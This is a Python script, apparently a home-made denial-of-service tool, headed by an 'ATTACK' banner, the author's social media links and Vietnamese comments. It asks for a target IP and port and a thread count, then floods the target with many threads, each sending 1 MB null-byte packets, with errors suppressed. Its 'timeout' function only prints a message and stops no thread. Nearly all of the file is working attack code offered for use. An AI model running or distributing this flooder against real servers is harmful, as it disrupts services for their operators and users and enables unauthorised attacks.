BLUE = "\033[94m"
RESET = "\033[0m"

ascii_text = """
 █████╗ ███████╗████████╗  █████╗  ██████╗██╗  ██╗
██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
███████║   ██║      ██║   ███████║██║     █████╔╝
██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗
██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
"""

print(BLUE + ascii_text + RESET)
YELLOW = "\033[93m"
GREEN = "\033[92m"
RED = "\033[91m"
RESET = "\033[0m"

print(YELLOW + "Tool by: Tỉnh Hà Hiệp" + RESET)
print(GREEN + "Tiktok: https://www.tiktok.com/@tinhhahiep?_r=1&_t=ZS-96T3YdbKg2W" + RESET)
print(RED + "Facebook: https://www.facebook.com/share/1Kg7gVy6KG/" + RESET)
#sửa làm chó 
#bố mày là Tỉnh Hà Hiệp
print("    ")
import socket
import threading
import time 
from colorama import Fore, Style, init
init(autoreset=True)

def send_packet(server_ip, server_port, packet, packet_count, thread_id) :
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((server_ip, server_port))
            for i in range(packet_count):
                s.sendall(packet)
            print(f"{Fore.GREEN}{Style.BRIGHT}Thread {thread_id} has sent {packet_count} packets.{Style.RESET_ALL}")
    except Exception as e:
            pass   #không hiển thị lỗi trong terminal

# Hàm xử Lý luồng sau 5 giây
def stop_thread_after_timeout(thread, timeout=5):
    time.sleep(timeout)
    if thread.is_alive():
        print(f"{Fore.YELLOW} {Style.BRIGHT}Thread {thread.name} has reached the 5-second timeout, stopping! {Style.RESET_ALL}") 
        # Tạm dừng việc gửi gói tin sau 5 giáy

server_address = input("Server IP: ")
server_ip, server_port = server_address.split(":")
server_port = int(server_port)  # Chuyến cống sang số nguyễn   

packet = b'\x00' * (1024 * 1024) #gói tin 1mb

packet_count = 10

thread_count = int(input("threads: "))

threads = []
for i in range(thread_count):
    thread = threading. Thread(target=send_packet, args=(server_ip, server_port, packet, packet_count, i+1)) 
    threads.append(thread)
    thread.start()

    timer = threading.Thread(target=stop_thread_after_timeout, args=(thread,)) 
    timer.start()
for thread in threads:
    thread.join()
print("Hoàn tất gửi gói tin.")
